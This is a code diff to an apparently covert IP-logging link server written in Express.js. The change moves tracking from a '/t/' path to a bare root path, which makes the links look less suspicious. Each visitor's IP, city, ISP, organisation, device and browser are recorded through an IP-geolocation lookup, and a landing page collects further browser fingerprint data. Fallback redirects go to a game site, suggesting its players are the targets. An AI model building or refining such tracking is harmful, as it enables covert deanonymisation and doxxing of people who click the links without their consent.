@@ -43,7 +43,7 @@ app.post('/api/create-link', (req, res) => {
   // The tracking URL on public host (Render / Custom Domain)
   const proto = req.headers['x-forwarded-proto'] || req.protocol || 'https';
   const host = req.headers['x-forwarded-host'] || req.get('host');
-  const trackUrl = `${proto}://${host}/t/${id}`;
+  const trackUrl = `${proto}://${host}/${id}`;
 
   console.log(`[TRACK] Created link: ${trackUrl} -> ${destination}`);
 
@@ -55,72 +55,7 @@ app.post('/api/create-link', (req, res) => {
   });
 });
 
-// ── Tracking endpoint — serves landing page ──────────────
-app.get('/t/:id', async (req, res) => {
-  const id = req.params.id;
-  const link = db.links[id];
 
-  if (!link) {
-    return res.redirect('https://standoff2.com');
-  }
-
-  // Grab real data from the request
-  const ip = req.ip || req.connection.remoteAddress || 'unknown';
-  const userAgent = req.headers['user-agent'] || 'unknown';
-  const lang = req.headers['accept-language'] || '';
-  const referer = req.headers['referer'] || '';
-  const timestamp = new Date().toISOString();
-
-  // Clean IP (remove ::ffff: prefix for IPv4)
-  const cleanIp = ip.replace('::ffff:', '');
-
-  // Geo lookup via free API
-  let geo = { country: '', city: '', isp: '', org: '', as: '', regionName: '' };
-  try {
-    const geoRes = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,countryCode,regionName,city,isp,org,as,query`);
-    const geoData = await geoRes.json();
-    if (geoData.status === 'success') {
-      geo = geoData;
-    }
-  } catch (e) {
-    console.error('[GEO] Lookup failed:', e.message);
-  }
-
-  // Parse user-agent for device info
-  const deviceInfo = parseUserAgent(userAgent);
-
-  const visitor = {
-    ip: cleanIp,
-    userAgent: userAgent,
-    device: deviceInfo.device,
-    os: deviceInfo.os,
-    browser: deviceInfo.browser,
-    country: geo.country || '',
-    countryCode: geo.countryCode || '',
-    city: geo.city || '',
-    region: geo.regionName || '',
-    isp: geo.isp || '',
-    org: geo.org || '',
-    language: lang.split(',')[0] || '',
-    referer: referer,
-    timestamp: timestamp,
-    extra: null
-  };
-
-  // Store
-  if (!db.visitors[id]) db.visitors[id] = [];
-  db.visitors[id].push(visitor);
-  db.links[id].clicks++;
-  saveData();
-
-  console.log(`[HIT] ${cleanIp} | ${geo.city}, ${geo.country} | ${deviceInfo.device} | ${deviceInfo.browser}`);
-
-  // Serve landing page instead of instant redirect
-  const destination = link.destination || 'https://standoff2.com';
-  const visitorIndex = db.visitors[id].length - 1;
-
-  res.send(getLandingPage(id, visitorIndex, destination));
-});
 
 // ── API: Receive extra browser fingerprint data ───────────
 app.post('/api/extra-data', (req, res) => {
@@ -357,6 +292,62 @@ app.use(express.static(path.join(__dirname)));
 // ── Healthcheck / Keep-alive endpoint ────────────────────
 app.get('/healthz', (req, res) => {
   res.status(200).send('OK');
+});
+
+// ── Tracking catch-all (MUST be last route) ───────────────
+app.get('/:id', async (req, res, next) => {
+  const id = req.params.id;
+  const link = db.links[id];
+
+  // If not a tracking link, pass through (404 or whatever)
+  if (!link) return next();
+
+  const ip = req.ip || req.connection.remoteAddress || 'unknown';
+  const userAgent = req.headers['user-agent'] || 'unknown';
+  const lang = req.headers['accept-language'] || '';
+  const referer = req.headers['referer'] || '';
+  const timestamp = new Date().toISOString();
+  const cleanIp = ip.replace('::ffff:', '');
+
+  let geo = { country: '', city: '', isp: '', org: '', as: '', regionName: '' };
+  try {
+    const geoRes = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,countryCode,regionName,city,isp,org,as,query`);
+    const geoData = await geoRes.json();
+    if (geoData.status === 'success') geo = geoData;
+  } catch (e) {
+    console.error('[GEO] Lookup failed:', e.message);
+  }
+
+  const deviceInfo = parseUserAgent(userAgent);
+
+  const visitor = {
+    ip: cleanIp,
+    userAgent: userAgent,
+    device: deviceInfo.device,
+    os: deviceInfo.os,
+    browser: deviceInfo.browser,
+    country: geo.country || '',
+    countryCode: geo.countryCode || '',
+    city: geo.city || '',
+    region: geo.regionName || '',
+    isp: geo.isp || '',
+    org: geo.org || '',
+    language: lang.split(',')[0] || '',
+    referer: referer,
+    timestamp: timestamp,
+    extra: null
+  };
+
+  if (!db.visitors[id]) db.visitors[id] = [];
+  db.visitors[id].push(visitor);
+  db.links[id].clicks++;
+  saveData();
+
+  console.log(`[HIT] ${cleanIp} | ${geo.city}, ${geo.country} | ${deviceInfo.device} | ${deviceInfo.browser}`);
+
+  const destination = link.destination || 'https://standoff2.com';
+  const visitorIndex = db.visitors[id].length - 1;
+  res.send(getLandingPage(id, visitorIndex, destination));
 });
 
 app.listen(PORT, '0.0.0.0', () => {
